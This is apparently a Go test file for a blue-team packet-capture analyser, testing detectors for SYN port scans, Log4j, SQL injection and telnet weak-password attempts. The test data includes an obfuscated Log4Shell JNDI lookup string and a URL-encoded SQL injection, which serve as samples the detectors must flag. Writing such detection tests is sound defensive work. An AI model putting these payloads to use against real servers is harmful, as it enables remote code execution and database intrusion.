package pcapjs

import (
	"os"
	"os/exec"
	"strings"
	"testing"

	"github.com/Martin2877/blue-team-box/pkg/conf"
)

type fakeSource map[string][]map[string][]string

func (f fakeSource) Query(filter string, fields []string) ([]map[string][]string, error) {
	return f[filter], nil
}

func TestLoadAll(t *testing.T) {
	r := Default()
	if len(r.List()) < 15 {
		t.Fatalf("策略加载不全: %d", len(r.List()))
	}
}

func TestSynScan(t *testing.T) {
	var rows []map[string][]string
	for p := 1; p <= 30; p++ {
		rows = append(rows, map[string][]string{"ip.src": {"1.1.1.1"}, "ip.dst": {"2.2.2.2"}, "tcp.dstport": {string(rune('0'+p%10)) + string(rune('a'+p))}})
	}
	res, err := Default().Run(fakeSource{"tcp.flags.syn==1 && tcp.flags.ack==0": rows}, []string{"port_scan_syn"})
	if err != nil || !res[0].Hit || res[0].Events[0].Src[0] != "1.1.1.1" {
		t.Fatalf("%+v %v", res, err)
	}
}

func TestLog4j(t *testing.T) {
	payload := "${${lower:j}ndi:${lower:l}dap://x/a}"
	hexp := ""
	for _, c := range []byte("GET / HTTP/1.1\r\nX: " + payload) {
		hexp += string("0123456789abcdef"[c>>4]) + string("0123456789abcdef"[c&15])
	}
	src := fakeSource{"frame contains 24:7b": {{"ip.src": {"1.1.1.1"}, "ip.dst": {"2.2.2.2"}, "tcp.payload": {hexp}}}}
	res, _ := Default().Run(src, []string{"log4j"})
	if !res[0].Hit {
		t.Fatalf("%+v", res)
	}
}

func TestSqli(t *testing.T) {
	src := fakeSource{"http.request": {{"ip.src": {"1.1.1.1"}, "ip.dst": {"2.2.2.2"}, "http.request.uri": {"/a.php?id=1%27+or+%271%27%3D%271"}}}}
	res, _ := Default().Run(src, []string{"sqli"})
	if !res[0].Hit {
		t.Fatalf("%+v", res)
	}
}

func TestTelnet(t *testing.T) {
	mk := func(n, src, dst, d string) map[string][]string {
		return map[string][]string{"frame.number": {n}, "ip.src": {src}, "ip.dst": {dst}, "tcp.stream": {"0"}, "telnet.data": {d}}
	}
	rows := []map[string][]string{
		mk("1", "9.9.9.9", "1.1.1.1", "login: "),
		mk("2", "1.1.1.1", "9.9.9.9", "r"), mk("3", "1.1.1.1", "9.9.9.9", "o"), mk("4", "1.1.1.1", "9.9.9.9", "\r\n"),
		mk("5", "9.9.9.9", "1.1.1.1", "Password: "),
		mk("6", "1.1.1.1", "9.9.9.9", "a"), mk("7", "1.1.1.1", "9.9.9.9", "b"), mk("8", "1.1.1.1", "9.9.9.9", "\r\n"),
		mk("9", "9.9.9.9", "1.1.1.1", "Login incorrect"),
	}
	res, _ := Default().Run(fakeSource{"telnet.data": rows}, []string{"telnet_weak_password"})
	if !res[0].Hit || !strings.Contains(res[0].Events[0].Desc, "ro/ab") || !strings.Contains(res[0].Events[0].Name, "失败") {
		t.Fatalf("%+v", res)
	}
}

// 真实 tshark 集成测试：存在 tshark 与样本时运行
func TestRealPcap(t *testing.T) {
	tshark := os.Getenv("TSHARK")
	if tshark == "" {
		if p, err := exec.LookPath("tshark"); err == nil {
			tshark = p
		}
	}
	pcap := os.Getenv("TEST_PCAP")
	if tshark == "" || pcap == "" {
		t.Skip("未设置 TSHARK / TEST_PCAP")
	}
	conf.GlobalConfig = &conf.Config{}
	conf.GlobalConfig.PcapAnalyseConfig.TsharkPath = tshark
	res, err := Default().Run(&TsharkSource{File: pcap}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range res {
		t.Logf("%s hit=%v err=%s events=%d", r.Strategy, r.Hit, r.Error, len(r.Events))
		for _, e := range r.Events {
			t.Logf("   %s | %s", e.Name, e.Desc)
		}
	}
}
